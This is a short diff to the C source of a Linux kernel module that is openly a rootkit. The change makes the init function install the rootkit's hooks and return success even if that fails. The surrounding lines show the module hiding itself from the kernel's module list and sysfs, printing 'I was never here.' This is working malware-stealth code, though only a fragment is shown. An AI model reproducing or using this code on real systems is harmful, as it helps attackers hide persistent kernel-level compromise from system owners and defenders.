@@ -46,13 +46,16 @@ static int install_rootkit(void) {
 }
 
 static int __init hello_rc_init(void) {
+	if (install_rootkit())
+		printk(KERN_INFO "Failed to install hooks.");
+
 	if (hide_self) {
 		try_module_get(THIS_MODULE);
 		kobject_del(&THIS_MODULE->mkobj.kobj);
 		list_del(&THIS_MODULE->list);
 		printk(KERN_INFO "I was never here.\n");
 	}
-	return install_rootkit();
+	return 0;
 }
 
 static void __exit hello_rc_exit(void) {
